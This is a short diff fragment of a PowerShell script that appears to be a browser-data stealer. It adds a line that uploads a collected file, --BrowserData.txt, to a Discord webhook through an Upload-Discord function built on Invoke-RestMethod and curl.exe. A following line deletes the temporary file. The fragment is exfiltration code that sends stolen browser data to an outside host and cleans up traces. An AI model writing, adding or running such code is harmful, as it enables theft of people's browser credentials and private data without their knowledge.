@@ -74,6 +74,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
+Upload-Discord -file $env:TMP\--BrowserData.txt
 
 ############################################################################################################################################################
 RI $env:TEMP/--BrowserData.txt
